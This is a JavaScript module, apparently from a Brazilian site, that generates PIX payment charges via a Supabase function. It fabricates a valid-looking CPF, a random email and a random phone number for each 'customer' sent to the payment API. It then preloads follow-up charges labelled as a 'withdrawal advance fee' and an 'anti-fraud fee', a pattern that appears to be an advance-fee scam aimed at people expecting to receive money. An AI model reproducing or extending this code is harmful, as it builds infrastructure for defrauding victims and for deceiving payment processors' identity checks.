const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

const PIX_CACHE_KEY = 'pixCacheData';
const PIX_CACHE_TIMESTAMP = 'pixCacheTimestamp';
const CACHE_EXPIRY_MS = 25 * 60 * 1000;

function getStoredFormData() {
  try {
    const stored = localStorage.getItem('userPixData');
    if (stored) {
      return JSON.parse(stored);
    }
  } catch (e) {
    console.error('Erro ao ler dados do localStorage', e);
  }
  return null;
}

function gerarCPF() {
  let cpf = '';
  for (let i = 0; i < 9; i++) {
    cpf += Math.floor(Math.random() * 10);
  }

  let soma = 0;
  for (let i = 0; i < 9; i++) {
    soma += parseInt(cpf.charAt(i)) * (10 - i);
  }
  let resto = 11 - (soma % 11);
  let dv1 = resto > 9 ? 0 : resto;
  cpf += dv1;

  soma = 0;
  for (let i = 0; i < 10; i++) {
    soma += parseInt(cpf.charAt(i)) * (11 - i);
  }
  resto = 11 - (soma % 11);
  let dv2 = resto > 9 ? 0 : resto;
  cpf += dv2;

  return cpf;
}

function gerarEmail(nome) {
  const provedores = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br'];
  const nomeFormatado = nome.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/\s+/g, '.');
  const provedor = provedores[Math.floor(Math.random() * provedores.length)];
  const numero = Math.floor(Math.random() * 999);
  return `${nomeFormatado}${numero}@${provedor}`;
}

function gerarTelefone() {
  const ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '91'];
  const num = Math.floor(10000000 + Math.random() * 90000000);
  return `${ddd[Math.floor(Math.random() * ddd.length)]}9${num}`;
}

export async function generatePixPayment(transactionType = 'initial', customAmount = null) {
  try {
    const formData = getStoredFormData();

    if (!formData) {
      throw new Error('Dados do formulário não encontrados');
    }

    let cpf = formData.chavePix;
    if (formData.tipoChave === 'CPF') {
      cpf = formData.chavePix.replace(/\D/g, '');
    } else {
      cpf = gerarCPF();
    }

    const payload = {
      customerName: formData.nome,
      customerEmail: gerarEmail(formData.nome),
      customerPhone: gerarTelefone(),
      customerDocument: cpf,
      pixKey: formData.chavePix,
      pixKeyType: formData.tipoChave,
      transactionType: transactionType,
    };

    if (customAmount) {
      payload.amount = customAmount;
    }

    if (transactionType === 'upsell1') {
      payload.itemTitle = 'Taxa de Antecipação de Saque';
    } else if (transactionType === 'upsell2') {
      payload.itemTitle = 'Taxa Anti-Fraude';
    }

    const apiUrl = `${SUPABASE_URL}/functions/v1/create-pix`;
    const headers = {
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Content-Type': 'application/json',
    };

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(data.error || 'Erro ao gerar PIX');
    }

    return data;
  } catch (error) {
    console.error('Erro ao criar PIX:', error);
    throw error;
  }
}

export function getCachedPix(transactionType) {
  try {
    const cacheKey = `${PIX_CACHE_KEY}_${transactionType}`;
    const timestampKey = `${PIX_CACHE_TIMESTAMP}_${transactionType}`;

    const cached = localStorage.getItem(cacheKey);
    const timestamp = localStorage.getItem(timestampKey);

    if (!cached || !timestamp) {
      return null;
    }

    const age = Date.now() - parseInt(timestamp);
    if (age > CACHE_EXPIRY_MS) {
      localStorage.removeItem(cacheKey);
      localStorage.removeItem(timestampKey);
      return null;
    }

    return JSON.parse(cached);
  } catch (e) {
    console.error('Erro ao ler cache de PIX:', e);
    return null;
  }
}

export function setCachedPix(transactionType, pixData) {
  try {
    const cacheKey = `${PIX_CACHE_KEY}_${transactionType}`;
    const timestampKey = `${PIX_CACHE_TIMESTAMP}_${transactionType}`;

    localStorage.setItem(cacheKey, JSON.stringify(pixData));
    localStorage.setItem(timestampKey, Date.now().toString());

    console.log(`PIX ${transactionType} armazenado em cache`);
  } catch (e) {
    console.error('Erro ao salvar cache de PIX:', e);
  }
}

export function clearCachedPix(transactionType) {
  try {
    const cacheKey = `${PIX_CACHE_KEY}_${transactionType}`;
    const timestampKey = `${PIX_CACHE_TIMESTAMP}_${transactionType}`;

    localStorage.removeItem(cacheKey);
    localStorage.removeItem(timestampKey);

    console.log(`Cache de PIX ${transactionType} limpo`);
  } catch (e) {
    console.error('Erro ao limpar cache de PIX:', e);
  }
}

export async function preloadInitialPix() {
  console.log('Iniciando pré-carregamento do PIX inicial...');

  const cached = getCachedPix('initial');
  if (cached) {
    console.log('PIX inicial já está em cache');
    preloadUpsell1Pix();
    return cached;
  }

  try {
    const pixData = await generatePixPayment('initial');
    setCachedPix('initial', pixData);
    console.log('PIX inicial pré-carregado com sucesso');

    preloadUpsell1Pix();

    return pixData;
  } catch (error) {
    console.error('Erro ao pré-carregar PIX inicial:', error);
    return null;
  }
}

export async function preloadUpsell1Pix() {
  console.log('Iniciando pré-carregamento do PIX upsell1...');

  const cached = getCachedPix('upsell1');
  if (cached) {
    console.log('PIX upsell1 já está em cache');
    preloadUpsell2Pix();
    return cached;
  }

  try {
    const pixData = await generatePixPayment('upsell1', 2874);
    setCachedPix('upsell1', pixData);
    console.log('PIX upsell1 pré-carregado com sucesso');

    preloadUpsell2Pix();

    return pixData;
  } catch (error) {
    console.error('Erro ao pré-carregar PIX upsell1:', error);
    return null;
  }
}

export async function preloadUpsell2Pix() {
  console.log('Iniciando pré-carregamento do PIX upsell2...');

  const cached = getCachedPix('upsell2');
  if (cached) {
    console.log('PIX upsell2 já está em cache');
    return cached;
  }

  try {
    const pixData = await generatePixPayment('upsell2', 2190);
    setCachedPix('upsell2', pixData);
    console.log('PIX upsell2 pré-carregado com sucesso');

    return pixData;
  } catch (error) {
    console.error('Erro ao pré-carregar PIX upsell2:', error);
    return null;
  }
}

export async function getOrGeneratePix(transactionType, customAmount = null) {
  const cached = getCachedPix(transactionType);

  if (cached) {
    console.log(`Usando PIX ${transactionType} do cache`);
    return cached;
  }

  console.log(`Gerando novo PIX ${transactionType}...`);
  const pixData = await generatePixPayment(transactionType, customAmount);
  setCachedPix(transactionType, pixData);

  return pixData;
}
